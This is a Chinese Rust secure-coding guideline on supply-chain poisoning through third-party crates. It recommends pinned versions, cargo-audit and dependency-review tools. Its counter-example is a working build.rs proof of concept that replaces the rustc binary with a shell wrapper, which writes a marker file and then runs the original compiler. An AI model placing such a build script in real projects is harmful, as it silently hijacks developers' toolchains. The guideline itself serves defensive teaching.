## P.SEC.01 使用第三方库的时候要确保可信的依赖，小心供应链攻击

**【描述】**

在 npm 中，node-ipc作者最近使用 npm 的安装脚本功能发起了 [供应链投毒攻击](http://blog.nsfocus.net/node-ipc-npm/)。 在 Rust 中，`build.rs` 和 过程宏 有可能被利用来做同样的事。

目前 Rust 编译器团队已经在着手起草[构建时使用沙盒的方案](https://github.com/rust-lang/compiler-team/issues/475)，但距离最终实现预计还有很长距离。

为了避免此类事件发生，可以遵循下列一些使用条款：

- 尽量减少第三方库的依赖
- 如果必须使用第三方库，需要对依赖进行安全维护和检查。
    - 为 `Cargo.toml` 中第三方依赖指定确切的版本（“=xyz”而不是“xyz”），如果需要更新版本，则在检查源码后手动应用次要的 SemVer 补丁。
    - 可以使用[`cargo-dephell`](https://github.com/mimoo/cargo-dephell)这样的工具对依赖进行分析
    - 配合[whackadep](https://github.com/diem/whackadep)这样的可视化工具来管理 Rust 依赖
- 使用 [`cargo-audit`](https://crates.io/crates/cargo-audit) 检测依赖的安全性。
- 使用自己的构建工具来替代 `Cargo`，可以更加安全。比如 Android 团队使用其`Soong`构建系统支持 Rust ，就选择不支持 `build.rs` ，就是考虑到审查起来太麻烦。

**【反例】**

下面是模拟 `build.rs` 投毒的示例：

```rust
// From: https://github.com/Neutron3529/poisoning-rustc

use std::{io::Write,fs,env,path::Path};

fn main() -> Result<(),Box<dyn std::error::Error>>{
    let cargo=env::var("CARGO")?;
    let cargo_dir=Path::new(&cargo);
    let bin=cargo_dir.parent().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "no!"))?;
    let rustc=env::var("RUSTC")?;
    let orc="old_".to_string()+&rustc;
    let rcloc=bin.join(rustc);
    let ocloc=bin.join(orc);
    if !ocloc.exists() && rcloc.exists(){
        fs::copy(&rcloc,&ocloc)?;// use copy to preserve 'x' permissions.
        let mut f=fs::File::create(rcloc)?;
        f.write_all(b"#!/bin/sh\necho 'The rustc has been \"poisoned\" by poisoning crate, which suggests that, your computer is not strong enough to defend such attack' > /tmp/rustc_infected\necho \"If you're using Linux, your rustc perhaps works just fine\" >> /tmp/rustc_infected\necho \"but windows users may suffer from executing a linux-only script.\" >> /tmp/rustc_infected\nexec ")?;
        f.write_all(ocloc.to_str().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "oh no!"))?.as_bytes())?;
        f.write_all(b" $*")?
    }
    Ok(())
}
```